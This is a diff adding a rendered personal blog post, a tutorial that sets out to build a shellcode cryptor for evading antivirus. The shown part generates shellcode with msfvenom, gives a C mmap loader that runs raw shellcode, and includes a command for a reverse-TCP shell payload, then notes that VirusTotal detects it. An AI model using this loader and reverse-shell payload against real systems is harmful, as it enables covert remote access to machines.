@@ -1,0 +1,94 @@
+I"x"<p>In this blogpost we will write an custom Shellcode Cryptor in go.</p>
+
+<h2 id="but-what-exactly-is-shellcode">But what exactly is Shellcode?</h2>
+<p>Shellcode is a combination of binary instruction that will be executed on cpu.
+Shellcode can be used for everything, to spawn a reverse shell, to execute a program, to obtain a file descriptor or whatever.
+We 1337-heckers use Shellcode because its independent, minimalistic, easy to hide and obfuscate and also perfect to inject into processes.
+Shellcode can be written by Hand which is very difficult and not recommended by me, i would recommend to extract Shellcode from Assembly or any compiled programs.</p>
+
+<h2 id="requirements-to-follow-this-blog">Requirements to follow this Blog</h2>
+<p>This tutorial is for Linux but the Shellcode encoding works same on any Operating System, only the process of execution is different.
+In this tutorial we will use Metasploit’s msfvenom to generate the Shellcode, C and mmap (a Linux systemcall) to make the Shellcode executable.
+Shellcode itself is not Executable, data has to be in a specific file format like ELF (used by Unix and Linux for binaries, shared libraries etc.) or the more famous one PE (Portable Executable the file format used by windows for .exe and .dll files) to be executable. Thats why we will use C to make our Shellcode executable inside our program. I highly recommend to use gcc (the gnu compiler collection) or clang to compile your C Code. The go toolchain is also required.</p>
+
+<h2 id="generating-our-first-shellcode">Generating our first Shellcode</h2>
+<p>In this blogpost we will use <code class="language-plaintext highlighter-rouge">/tmp/blog/</code> as workspace.
+We will generate Unencrypted Shellcode in C format (later we will use the raw format).
+The Shellcode we will generate with msfvenom will execute the “ls” program.
+The -b option is for avoiding bytes, in Shellcoding on <strong>x86</strong> we always have to avoid 
+NULL-BYTES because it will make our Shellcode stop working (i will not go into depth here).
+With specifying <code class="language-plaintext highlighter-rouge">-f c</code> we use the C format, it will output a C-bytearray which is just a normal array and can easily just get copied and pasted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># create and navigate to workspace </span>
+<span class="nv">$ </span><span class="nb">sudo </span>su
+<span class="nv">$ </span><span class="nb">mkdir</span> /tmp/blog
+<span class="nv">$ </span><span class="nb">cd</span> /tmp/blog
+<span class="c"># generate and show Shellcode </span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s2">"ls"</span> <span class="nt">-f</span> <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> c <span class="nt">-o</span> raw.txt 
+<span class="nv">$ </span><span class="nb">cat </span>raw.txt
+
+</code></pre></div></div>
+<h1 id="executing-the-shellcode-in-c">Executing the Shellcode in C</h1>
+<p>Now copy the output of <code class="language-plaintext highlighter-rouge">cat raw.txt</code> into the C code down below here and replace your output with the “bytes” array”, the has to be renamed to “bytes”.
+After its done it should look like this.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="c1">    /* standard input/output */</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="c1">   /* used for memcpy */</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="c1"> /* header for mmap syscall and flags */</span><span class="cp">
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">bytes</span><span class="p">[]</span> <span class="o">=</span> 
+<span class="s">"</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="cm">/* allocate a memory map */</span>
+	<span class="kt">void</span><span class="o">*</span> <span class="n">region</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> 
+
+			<span class="k">sizeof</span><span class="p">(</span><span class="n">bytes</span><span class="p">),</span>
+			<span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
+			<span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span>
+			<span class="o">-</span><span class="mi">1</span><span class="p">,</span>
+			<span class="mi">0</span><span class="p">);</span>
+	<span class="cm">/* check for error */</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">region</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="cm">/* copy shellcode into allocated memory page*/</span>
+	<span class="n">memcpy</span><span class="p">(</span><span class="n">region</span><span class="p">,</span> <span class="n">bytes</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bytes</span><span class="p">));</span>
+	
+	<span class="cm">/* debug message */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"executing %d bytes shellcode using mmap system call</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bytes</span><span class="p">));</span>
+
+	<span class="cm">/* executing the shellcode via function pointer */</span>
+	<span class="p">((</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">region</span><span class="p">)();</span>
+	
+	<span class="cm">/* deallocate the memory */</span>
+	<span class="n">munmap</span><span class="p">(</span><span class="n">region</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bytes</span><span class="p">));</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="notes-and-compiling-the-program">Notes and Compiling the Program</h2>
+<p>This blog is not a C course you already should be familiar with the C language.
+I will compile the program with the following command
+<code class="language-plaintext highlighter-rouge">gcc -m32 file.c -o runme &amp;&amp; ./runme</code>
+The -m32 option stands basically for 32 bit make sure you have gcc-multilib installed to be able to use the 32-bit headers. After Compiling and 
+executing the program we should get following output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>executing 39 bytes shellcode using mmap system call
+file.c	raw.txt  runme
+</code></pre></div></div>
+<p>as we see the c code and the Shellcode execute “ls”, thats why it listed the files down below there.</p>
+
+<h2 id="generating-reverse-shell-shellcode-with-msfvenom">Generating Reverse-Shell-Shellcode with msfvenom</h2>
+<p>Now we will generate Shellcode which will spawn a Reverse-Shell.
+To run the Shellcode you have todo the same as before, just copy the output, paste, rename the array, compile and run.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b "\x00" -f c -o raw.txt 
+</code></pre></div></div>
+<p>For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected.</p>
+
+<p><img src="https://github.com/calloczero/calloczero.github.io/blob/main/_images/crop.png?raw=true" alt="VirusTotal Screenshot" /></p>
+
+:ET
